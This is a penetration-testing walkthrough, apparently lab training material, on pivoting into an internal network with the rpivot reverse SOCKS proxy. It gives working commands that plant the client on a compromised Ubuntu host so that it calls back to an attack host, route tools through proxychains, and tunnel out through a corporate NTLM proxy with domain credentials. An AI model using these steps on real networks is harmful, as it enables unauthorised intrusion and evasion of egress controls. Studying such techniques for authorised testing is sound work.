# Web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy written in Python that flips the typical connection model. Instead of the attacker pushing a listener into the network, the compromised internal machine reaches outward to the attacker's server, which then exposes a SOCKS proxy on the attack host. This reverse-connection model makes it useful in environments where inbound connections to internal hosts are blocked but outbound connections are permitted. [github](https://github.com/wi-fi-analyzer/rpivot)

## How Rpivot Differs from Forward Proxies

With standard SSH dynamic port forwarding, the attacker opens a SOCKS listener on their own machine and traffic flows inward through an existing SSH session. Rpivot works in the opposite direction -- the internal pivot host is the one initiating the connection outward to the attacker's server, making the attacker's machine the SOCKS entry point for reaching internal resources.  This mirrors how reverse shells work compared to bind shells. [blog.raw](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

## Setup Walkthrough

### Step 1 -- Prepare the Server Side (Attack Host)

Clone the repo and ensure Python 2.7 is available. If your system does not have it, pyenv provides a clean installation path:

```bash
git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7
```

Start the rpivot server on the attack host. Port 9999 is where the internal client will call back, and port 9050 is the local SOCKS proxy port you will configure proxychains to use:

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Step 2 -- Transfer and Run the Client on the Pivot Host

Copy the rpivot directory to the compromised Ubuntu server via SCP:

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

On the Ubuntu pivot host, run the client pointing back to the attack host:

```bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

The attack host will confirm the callback:

```
New connection from host 10.129.202.64, source port 35226
```

### Step 3 -- Route Traffic Through the SOCKS Proxy

With `127.0.0.1:9050` set in `/etc/proxychains.conf`, any tool prefixed with proxychains will have its traffic tunneled through the pivot host into the `172.16.5.0/23` network. For browser-based access to an internal web server:

```bash
proxychains firefox-esr 172.16.5.135:80
```

## NTLM Proxy Authentication

Some corporate environments enforce an HTTP proxy with NTLM authentication controlled by the Domain Controller, sitting between the internal network and the internet.  A standard reverse connection would be rejected at this corporate proxy layer before reaching the attacker's server. Rpivot handles this natively through its client flags: [exploit-db](https://www.exploit-db.com/exploits/45554)

```bash
python client.py --server-ip <IPaddressofTargetWebServer> \
  --server-port 8080 \
  --ntlm-proxy-ip <IPaddressofProxy> \
  --ntlm-proxy-port 8081 \
  --domain <nameofWindowsDomain> \
  --username <username> \
  --password <password>
```

The client performs the NTLM negotiation handshake with the corporate proxy, authenticates, and then tunnels the rpivot connection through it to reach the external attack host.  This is a key differentiator from sshuttle or standard SSH port forwarding, neither of which can authenticate through a corporate NTLM proxy to reach outbound destinations. [github](https://github.com/klsecservices/rpivot/blob/master/client.py)

## Tool Comparison at a Glance

| Aspect | Rpivot | SSH Dynamic Forward | Sshuttle |
|---|---|---|---|
| Connection direction | Reverse (target calls back) | Forward (attacker initiates) | Forward (attacker initiates) |
| Protocol | SOCKS4 over TCP | SOCKS5 over SSH | NAT via SSH |
| NTLM proxy support | Yes | No | No |
| Requires Python on pivot | Python 2.7 | No | Python 3 |
| Proxychains needed | Yes | Yes | No |
| Attack host OS | Linux | Linux or Windows | Linux only |
